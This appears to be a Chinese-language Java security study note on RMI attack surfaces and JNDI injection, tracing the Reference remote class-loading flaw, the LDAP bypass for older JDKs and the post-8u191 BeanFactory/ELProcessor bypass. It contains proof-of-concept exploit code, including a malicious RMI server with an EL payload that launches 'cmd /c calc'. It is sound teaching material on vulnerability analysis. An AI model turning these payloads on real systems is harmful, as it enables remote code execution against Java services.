---
type: 查阅
status: active
created: 2026-11-13
updated: 2026-11-13
tags: [Java, 代码审计, RMI, JNDI, 反序列化]
本线: 只查不读
源: JAVA安全-全本（2026-11-13 拆）
---

# 17 · RMI 攻击面与 JNDI 注入

> 查阅区 · **只查不读**，不进学习路径。原文拆自 `JAVA安全-全本`，正文一字未改，仅调标题层级与图片相对路径。
> 什么时候翻：判 JNDI 注入是否成立：协议、JDK 版本、出网三件

## RMI攻击方式

根据基础中分析的RMI运行流程可知有以下几种攻击方式

- Client打Registry
- Client打Server
- Client

但在8u121版本后很多攻击方式以及被过滤了

- 在`RegistryImpl`中加了一个`registryFileter`函数，限制了可以反序列化的类

  ![Snipaste_2025-04-05_10-54-17](../JAVA安全/Snipaste_2025-04-05_10-54-17.png)

- 同样在`DGCImpl`中也加入了`checkInput`函数，限制了更少的类可以反序列化

  ![Snipaste_2025-04-05_10-57-15](../JAVA安全/Snipaste_2025-04-05_10-57-15.png)

总的来讲RMI的利用范围并不广，且利用的主要就是CC链再做一些变形，不做深入的代码分析，深入的攻击利用可以参考文章：

https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#1-%E6%94%BB%E5%87%BB-RMI-Registry


## JNDI注入

- 影响rmi协议或ldap协议的使用
  - JDK版本不同
  - 中间件的不同
  - 网络限制
  - 防护设备

- 以下为JNDI中调用RMI服务的实例

`JNDIRMIServer.java`

```java
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        //其中RemoteObjImpl类的实现与RMI中一致
        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());

    }
}

```

`JNDIRMIClient.java`

```java 
import javax.naming.InitialContext;

public class JNDIRMIClient {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");
        System.out.println(remoteObj.sayHello("hello"));
    }
}

```

### RMI原生漏洞

api虽然是JNDI服务的但实际上调用的还是RMI库中的原生`lookup()`

调用`lookup()`处下断点

![Snipaste_2025-04-07_10-57-38](../JAVA安全/Snipaste_2025-04-07_10-57-38.png)

- 跟进断点，先调用`initialContext.lookup()`

  ![Snipaste_2025-04-07_10-58-14](../JAVA安全/Snipaste_2025-04-07_10-58-14.png)

- 继续跟进到`RegistryContext`类中，可以看到调用的是原生的RMI服务也就意味着也存在RMI中的漏洞

  ![Snipaste_2025-04-07_10-58-51](../JAVA安全/Snipaste_2025-04-07_10-58-51.png)

  ![Snipaste_2025-04-07_10-59-08](../JAVA安全/Snipaste_2025-04-07_10-59-08.png)

### Reference引用漏洞

服务端代码改为以下内容

```java
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("JNDICalc", "JNDICalc", "http://localhost:5791/");
        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
    }
}

```

- `Reference`构造函数，使用`factory`来表示一个类，然后给出`factory`地址来进行远程类加载

  ![Snipaste_2025-04-07_12-21-05](../JAVA安全/Snipaste_2025-04-07_12-21-05.png)

  - `JNDICalc`代码如下

    ```java
    public class JndiCalc {  
        public JndiCalc() throws Exception {  
            Runtime.getRuntime().exec("calc");  
     }  
    }
    ```

- 还是跟进`RegistryContext.lookup()`

  ![Snipaste_2025-04-07_12-26-20](../JAVA安全/Snipaste_2025-04-07_12-26-20.png)

  - 此处绑定的并不是`Reference`，可以在服务端下断点跟踪一下为什么

    ![Snipaste_2025-04-07_13-47-30](../JAVA安全/Snipaste_2025-04-07_13-47-30.png)

  - 跟进到`encodeObject()`

    ![Snipaste_2025-04-07_12-28-00](../JAVA安全/Snipaste_2025-04-07_12-28-00.png)

    ![Snipaste_2025-04-07_12-35-40](../JAVA安全/Snipaste_2025-04-07_12-35-40.png)

    - 可以看到在此处换了一个新类

- 继续跟踪类的加载过程，跟进`lookup()`下的`decodeObject`

  ![Snipaste_2025-04-07_13-52-34](../JAVA安全/Snipaste_2025-04-07_13-52-34.png)

  - 然后调用`NamingManager.getObjectInstance()`

    ![Snipaste_2025-04-07_12-38-21](../JAVA安全/Snipaste_2025-04-07_12-38-21.png)

  - 一直到其中获取`factory`的地方，获得恶意类名称

    ![Snipaste_2025-04-07_12-39-51](../JAVA安全/Snipaste_2025-04-07_12-39-51.png)

  - 然后进行类加载，先用`AppClassLoade`r进行本地类加载，加载不到class为null

    ![Snipaste_2025-04-07_12-40-35](../JAVA安全/Snipaste_2025-04-07_12-40-35.png)

    ![Snipaste_2025-04-07_12-41-00](../JAVA安全/Snipaste_2025-04-07_12-41-00.png)

  - 然后通过服务端绑定的地址进行远程加载

    ![Snipaste_2025-04-07_14-00-07](../JAVA安全/Snipaste_2025-04-07_14-00-07.png)

    ![Snipaste_2025-04-07_12-53-59](../JAVA安全/Snipaste_2025-04-07_12-53-59.png)

  - 最后通过`newInstance()`执行，因为恶意代码写在类的构造函数中

    ![Snipaste_2025-04-07_13-00-59](../JAVA安全/Snipaste_2025-04-07_13-00-59.png)

- 此漏洞就是JNDI专属的URLClassLoader的动态恶意类加载，在jdk8u121中修复，只允许客户端的`lookup()`进行本地方法调用

### LDAP引用漏洞

针对于引用漏洞JDK在8u121后做了修复，在`RegistryContext`，`CNCtx`中添加了`trustURLCodebase`并默认为false，`System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "false");`

修复代码如下

```java
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 } else {  
 return null;  
 }  
 }
```

但对于JDK版本介于8u121-8u191、7u131-7u201与6u141-6u211之间时，可以用LDAP+Reference绕过

基本的处理逻辑和RMI引用漏洞一致，只不过JNDI是在`LdapCtx`类中处理LDAP服务

- 先对对象进行`decodeObject()`

  ![Snipaste_2025-04-07_21-06-33](../JAVA安全/Snipaste_2025-04-07_21-06-33.png)

  - 解析`Reference`对象

    ![Snipaste_2025-04-07_21-08-45](../JAVA安全/Snipaste_2025-04-07_21-08-45.png)

- 然后进行远程类加载，此处也不一样，调用的是`DirectoryManager.getObjectInstance()`

  ![Snipaste_2025-04-07_21-09-54](../JAVA安全/Snipaste_2025-04-07_21-09-54.png)

  - 同样调用`getObjectFactoryFromReference()`，此后的代码逻辑就一样了

    ![Snipaste_2025-04-07_21-15-14](../JAVA安全/Snipaste_2025-04-07_21-15-14.png)

    - 之后同样本地类加载不到，然后获取codebase也就是reference地址，通过`URLClassLoader`进行远程类加载，最后实例化触发构造函数中的恶意函数

### jdk8u191之后绕过

恶意服务端代码

```java
import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;

public class JNDIRMIByPassServer {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        String payload = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                        ".newInstance().getEngineByName(\"JavaScript\")" +
                        ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                        "(['cmd', '/c', 'calc']).start()\")";
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",
                true,"org.apache.naming.factory.BeanFactory",null );
        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", payload));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
    }
}

```

同样在客户端`lookup()`处下断点

![Snipaste_2025-04-08_12-27-25](../JAVA安全/Snipaste_2025-04-08_12-27-25.png)

- 同样在`RegistryContext`中进入`NamingManager.getObjectInstance`

  ![Snipaste_2025-04-08_12-28-22](../JAVA安全/Snipaste_2025-04-08_12-28-22.png)

  - 获取factory

    ![Snipaste_2025-04-07_21-15-14](../JAVA安全/Snipaste_2025-04-07_21-15-14.png)

  - 直接加载本地`BeanFactory`类

    ![Snipaste_2025-04-08_12-31-27](../JAVA安全/Snipaste_2025-04-08_12-31-27.png)

- 跟进 `getObjectInstance()` 

  ![Snipaste_2025-04-08_11-04-14](../JAVA安全/Snipaste_2025-04-08_11-04-14.png)

  - 这里判断obj参数是否是`ResourceRef`类实例，所以构造`Reference`类实例时要用`ResourceRef`创建

    ![Snipaste_2025-04-08_12-34-50](../JAVA安全/Snipaste_2025-04-08_12-34-50.png)

  - 接着获取 Bean 类为 `javax.el.ELProcessor` 后，实例化该类并获取其中的 `forceString` 类型的内容，其值就是构造的 `x=eval` 内容

    ![Snipaste_2025-04-08_11-05-16](../JAVA安全/Snipaste_2025-04-08_11-05-16.png)

  - 查找 `forceString` 的内容中是否存在”=”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，**之前设置的 `forceString` 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 `BeanFactory` 类能进行利用的关键点！**

    ![Snipaste_2025-04-08_11-08-17](../JAVA安全/Snipaste_2025-04-08_11-08-17.png)

  - 获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()反射调用执行

    ![Snipaste_2025-04-08_11-09-52](../JAVA安全/Snipaste_2025-04-08_11-09-52.png)
